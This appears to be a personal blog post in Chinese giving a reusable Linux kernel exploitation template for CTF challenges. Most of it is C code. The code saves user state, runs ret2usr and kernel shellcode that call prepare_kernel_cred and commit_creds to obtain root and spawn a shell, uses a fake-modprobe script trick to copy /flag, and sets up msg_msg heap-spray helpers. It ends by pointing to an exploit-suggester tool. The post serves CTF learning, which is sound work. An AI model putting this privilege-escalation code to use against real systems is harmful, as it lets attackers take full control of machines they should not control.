---
layout: post
tags: [kernel_pwn]
title: "kernel pwn template"
author: wsxk
date: 2022-10-11
comments: true
---

- [1. 常用字节码](#1-常用字节码)
- [2. kernel module](#2-kernel-module)
- [3. 如何找洞?](#3-如何找洞)
  - [3.1 LES](#31-les)



PS:更新与`2026-07-26`<br>

## 1. 常用字节码<br>

    iretq: 48 cf
    swapgs: 0f 01 f8

## 2. kernel module<br>
以目前浅薄的kernel pwn经验，总结了一套kernel pwn时会用到的基本操作，不定时更新~<br>
```c
// gcc -fcf-protection=none -masm=intel -static xxx.c -o xxx

#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h> // read, write
#include <stdlib.h>
#include <fcntl.h> // define open, O_RDONLY, O_WRONLY, O_CREAT 
#include <signal.h>
#include <sys/wait.h> // waitpid
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>  // ioctl
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h> // msg_msg 
#include <sched.h> 
#include <stdint.h>


size_t commit_creds= 0xffffffff814c6410;
size_t prepare_kernel_cred =0xffffffff814c67f0;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_status(void){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void get_root_shell(void){
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

// ret2usr
unsigned long user_rip = (unsigned long)get_root_shell;
void escalate_privs(void){
    __asm__(
        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, commit_creds;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
    );
}


// kernel shellcode
__attribute__((naked, noinline)) void privilege_escalation_kernel_shellcode(){
    __asm__ (
        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
        "mov rdi, 0;"
        "call rbx;"     //prepare_kernel_cred(0)
        "mov rdi, rax;" 
        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
        "call rbx;"
        "nop;"
        "ret;"
    );
}

// modprobe
void environ_set(void){
    puts("[*] Returned to userland, setting up for fake modprobe");
    
    //system("mkdir /tmp");
    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/exp");
    system("chmod +x /tmp/exp");

    system("printf '\xff\xff\xff\xff'  > /tmp/dummy");
    system("chmod 777 /tmp/dummy");
    //exit(0);
}
void get_flag(void){
    puts("[*] Run unknown file");
    system("cat /proc/sys/kernel/modprobe");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");
    exit(0);
}


// msg_msg 
// make sure the process run in one fixed cpu
static void pin_to_current_cpu(void)
{
    cpu_set_t set;
    int cpu = sched_getcpu();

    if (cpu < 0) {
        fprintf(stderr, "[-] sched_getcpu failed: %s\n", strerror(errno));
        return;
    }

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0)
        fprintf(stderr, "[-] sched_setaffinity failed: %s\n", strerror(errno));
    else
        fprintf(stderr, "[+] pinned to CPU %d\n", cpu);
}

static void fatal(const char *what)
{
    perror(what);
    exit(EXIT_FAILURE);
}

#define TARGET_OBJECT_SIZE  0x1d0UL          /* need to change according to the situation*/
#define MSG_HEADER_SIZE    0x30UL
#define MSGSEG_HEADER_SIZE 0x08UL
#define DATAMSG_LEN        (0x1000UL - MSG_HEADER_SIZE)       /* 0xfd0 */
#define DATAMSGSEG_LEN     (TARGET_OBJECT_SIZE - MSGSEG_HEADER_SIZE)
#define MESSAGE_SIZE        (DATAMSG_LEN + DATAMSGSEG_LEN)       /* target msg size */

struct message {
    long type;
    unsigned char text[MESSAGE_SIZE];
};

int msg_create_queue(){
    // int key = ftok(".",0); // create a new key and can be found by other process
    // int msg_id = msgget(key,0666| IPC_CREAT);
    int msg_id = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msg_id < 0)
        fatal("msgget");
    fprintf(stderr, "[+] created SysV message queue %d\n", msg_id);
    return msg_id;
}

void msg_send(int msg_id, void *msg_addr,int msg_size, int flag){
    int mark = msgsnd(msg_id,msg_addr,msg_size,flag);
    if (mark <0){
        fatal("msg send");
    }
}

void msg_recv(int msg_id, void *msg_addr,int msg_size,int msg_type, int flag){
    int received = msgrcv(msg_id, msg_addr, msg_size, msg_type, flag);
    if (received < 0){
        fatal("msgrcv");
    }
}

```


## 3. 如何找洞?<br>
有的CTF题目会给一个ko文件（内核驱动模块），可以通过ida逆向分析来挖掘漏洞。那么，如果CTF题目只给了一个linux kernel，你又该如何应对呢？<br>

### 3.1 LES<br>
这就不得不提到一个牛逼的开源工具`LES(linux-exploit-suggester)`了，其已在github上开源：[https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)<br>
通过下载其脚本并运行，我们可以得知两件事:<br>
```
1. 当前linux kernel 可能能够利用的 cve漏洞
2. 当前linux kernel 开启/关闭的 安全加固措施
```


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>